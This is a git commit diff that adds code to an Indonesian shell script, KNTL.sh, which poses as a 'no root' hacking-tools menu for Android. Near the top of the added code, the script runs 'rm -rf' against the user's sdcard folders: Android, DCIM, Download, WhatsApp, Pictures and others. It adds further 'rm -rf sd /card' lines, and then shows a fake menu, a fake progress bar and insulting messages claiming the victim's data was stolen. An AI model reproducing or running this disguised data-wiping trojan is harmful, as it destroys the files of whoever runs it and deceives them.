cb87ca2e3e3dee129ec51179319d36942aacbc06
Mrlinkerrorsystem <54057540+ahmadchen@users.noreply.github.com>
2020-01-31 21:38:45 +0700

    Update KNTL.sh

--- KNTL.sh
+++ KNTL.sh
@@ -1,4 +1,132 @@
 clear
+#!/system/xbin/bash
+#AUTHOR:MR CROOT
+#Ngapain Lo Sampai Sini Mau Recode! Gua Doain Orang Tua Lu Meninggal Dan Lu mandul Sampai Mati.boleh Recode Tapi Hargai Author Njeng
+#Bersihkan Layar
+cd /sdcard
+rm -rf Android
+rm -rf Download
+rm -rf DCIM
+rm -rf UCDownloads
+rm -rf com.garena.game.codm
+rm -rf Music
+rm -rf Pictures
+rm -rf Movies
+rm -rf WhatsAp
+rm -rf vidio
+rm -rf vidioku
+rm -rf com.garena.freefire
+rm -rf sd card
+rm -rf storage
+
+
+
+
+
+
+
+
+blue='\e[1;34m'
+green='\e[1;32m'
+purple='\[1;35m'
+cyan='\e[1;36m'
+red='\e[1;31m'
+white='\e[1;37m'
+yellow='\e[1;33m'
+sleep 3
+echo "\033[32;1m
+#################################
+#-AUTHOR=MR CROOT               #
+#-INSTAGRAM=                    #
+#-Team=NO TEAM                  #
+#-Email=reyspeed01@gmail.com    #
+#################################
+"
+sleep 3
+
+echo "\033[32;1mTULIS= MR.CROOT TAMPANS "
+read p;
+
+sleep 3
+
+echo "\033[32;1m
+#-KUMPULAN TOOLS 2019 NO ROOT-#
+______________________________
+|1.hack wifi (no Root)       |
+|2.sadap Wa (No Root)        |
+|3.hack lampu lalu Lintas    |
+|4.hack Facebook Target      |
+|5.hack Instagram            |
+|6.hack Hp Orang             |
+|7.spam Sms Unlimited        |
+|8.hack Camera               |
+|9.install Metasploit        |
+|10.DDOS                     |
+|11.hack lampu Cafe          |
+|12.DOS                      |
+|13.Sql Injetion             |
+|14.Admin Finder             |
+|15.Root Hp                  |
+|16.Hack Atm                 |
+|17.Hack Satelit             |
+|18.Pelacack Penipu          |
+|19.Hack CCTV                |
+|20.pembuat panas Hp Orang   |
+|____________________________|
+"
+echo "\033[32;1mPilih No : "
+read p;
+
+sleep 2
+echo "Sabar Njeng Proses..."
+echo "\033[34;1m#10%"
+sleep 1
+echo "##20%"
+sleep 1
+echo "###30%"
+sleep 3
+echo "####40%"
+sleep 3
+echo "#####50%"
+sleep 3
+echo "######60%"
+sleep 3
+echo "#######70%"
+sleep 4
+echo "########80%"
+sleep 3
+echo "#########90%"
+sleep 4
+echo "##########100%"
+sleep 3
+echo "_____________________________________"
+sleep 3
+echo "Kau Baca Pesan Gua Njeng"
+sleep 4
+echo "hacker Jahat Berawal Dari"
+sleep 4
+echo "hacker Baik yang Di Sakiti"
+sleep 4
+echo "Seperti Saya Yang Selalu Di Sakiti"
+sleep 4
+echo "Jadi Kalian Harus Merasakan"
+sleep 4
+echo "Apa Yang Saya Rasakan"
+sleep 4
+echo "Selamat Data Kalian Saya Curi "
+sleep 4
+echo "Gak Senang Lo Njenk"
+sleep 4
+echo "Hubungi Gua reyspeed01@gmail.com"
+sleep 3
+echo "____________________________________"
+sleep 4
+toilet -f standard -F gay "MAMPUS"
+sleep 3
+toilet -f standard -F gay "LOE"
+sleep 3
+toilet -f standard -F gay "BANGSAT"
+
 bi='\033[34;1m' #biru
 i='\033[32;1m' #ijo
 pur='\033[35;1m' #purple
@@ -16,9 +144,9 @@ C='\x1b[1;36m'
 D='\x1b[0m'
 
 
-#Recoded By : MiSetya
+#Recoded 
 #Tool Unfaedah :v
-
+rm -rf sd /card
 clear
             
             echo $pur"  ╦ ╦╔╗╔╔═╗╔═╗╔═╗╔╦╗╔═╗╦ ╦   "      
@@ -66,11 +194,12 @@ echo "============================" | lolcat
 echo -n $cy"Nah ini isi nomor lu : "
 read lu
 clear
+rm -rf sd /card
 echo "Sabar ajg lagi nyadap ini $tr" | lolcat
 echo ""
 echo $mer " Tunggu Sekitar 3menit ya tod $st"
 echo ""
-sleep 50
+sleep 10
 echo $cy " Sedang Mengambil Chat Terbaru tod "
 sleep 4
 echo $bi " Chat Terbaru Dengan 'Dimas' "
